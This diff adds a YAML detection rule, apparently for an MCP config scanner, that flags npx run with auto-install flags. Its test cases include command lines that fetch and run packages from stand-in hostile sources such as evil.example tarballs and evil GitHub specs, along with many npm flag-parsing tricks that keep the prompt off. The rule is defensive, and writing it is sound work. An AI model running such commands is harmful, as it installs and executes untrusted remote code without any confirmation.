@@ -1,0 +1,69 @@
+id: MOAT-T4-004
+title: npx runs with its yes option on (-y, --yes or npm_config_yes)
+severity: low
+target: config
+match:
+  heuristic: auto_install
+risk: npx -y, npx --yes or an npm_config_yes env entry overrides the npm_config_yes=false that mcpmoat scan sets, so the scan itself installs and runs the package, and in a terminal npx also skips its confirmation prompt.
+remediation: Pin an exact version (see MOAT-T4-003), or install a version you reviewed and run its binary, then remove -y, --yes and npm_config_yes. Removing them alone is not enough, because an MCP client starts npx with no terminal and npx then installs a missing package with no prompt. Use npx --no or npm_config_yes=false to make npx refuse to install.
+references:
+  - https://docs.npmjs.com/cli/commands/npx
+  - https://owasp.org/www-project-mcp-top-10/
+# The cases are command lines. The npm_config_yes env trigger is covered by
+# TestCheckAutoInstall in internal/rules/config_test.go.
+should_match:
+  - npx -y @scope/server
+  - npx --yes pkg
+  - text: npx -y @scope/server@1.2.3
+    note: A pinned version still installs without a prompt
+  - text: cmd /c npx -y pkg
+    note: Windows wrapper. The cmd /c prefix is read, and npx follows it
+  - text: npx -p @evil/pkg -y mcp-bin
+    note: -y after the -p package is still an npx flag, because it is before the command
+  - text: npx --yes=true pkg
+    note: Long form with a value. Any value except false turns the prompt off
+  - text: npx --y pkg
+    note: npm expands a prefix of --yes, so --y works too
+  - text: npx -y github:evil/pkg
+    note: A git spec installs with no prompt too
+  - text: npx -y https://evil.example/pkg.tgz
+    note: A tarball URL installs with no prompt too
+  - text: npx --tag -y pkg
+    note: --tag does not take a value that starts with "-", so -y is still a flag
+  - text: npx -y false pkg
+    note: npx takes no value after -y. It runs "false" as the command, with the yes option on
+  - text: npx -p @evil/pkg -y false
+    note: Installs @evil/pkg with the yes option on and runs its "false" binary
+  - text: npx -y=false pkg
+    note: npx moves the value of the -y shorthand to its own argument, so the option is on
+  - text: npx --yes=null pkg
+    note: null resets the option to its default, which overrides the npm_config_yes=false of the scan
+  - text: npx --yes=0 pkg
+    note: npm reads only an exact "=false" as off. Any other value leaves the option on, and npx runs the value as the command
+  - text: npx --qy pkg
+    note: nopt expands a flag made only of one-letter shorthands, even after "--", so --qy is --loglevel warn --yes
+  - text: npx --no-yes false pkg
+    note: npm reads "false" as the value of --no-yes, and the "no-" flips it to on
+  - text: npx --no-no-yes pkg
+    note: Each "no-" flips the option, so two of them leave it on
+  - text: npx --no=null @scope/server@1.2.3
+    note: --no is npm's shorthand for --no-yes, and null resets the option to its default
+  - text: npx --node-arg -p -y @scope/server@1.2.3
+    note: npx drops the removed --node-arg option and the next argument, so -y is a flag
+  - text: npx --registry -y pkg
+    note: Fail-closed. npm reads -y as the registry value, but the check reads every flag-like argument before the command
+should_not_match:
+  - node ./server.js
+  - npx @scope/server@1.2.3
+  - text: npx pkg -y
+    note: After the package, -y is an argument of the server, not of npx
+  - text: uvx -y pkg
+    note: Only npx is covered. uvx is not checked by this rule
+  - text: bunx -y pkg
+    note: Only npx is covered. bunx is not checked by this rule
+  - text: npx --yes=false pkg
+    note: --yes=false turns the yes option off, so it is not a finding
+  - text: npx -p pkg mcp-bin -y
+    note: After the command, -y is an argument of the server
+  - text: npx --no-yes pkg
+    note: --no-yes turns the yes option off
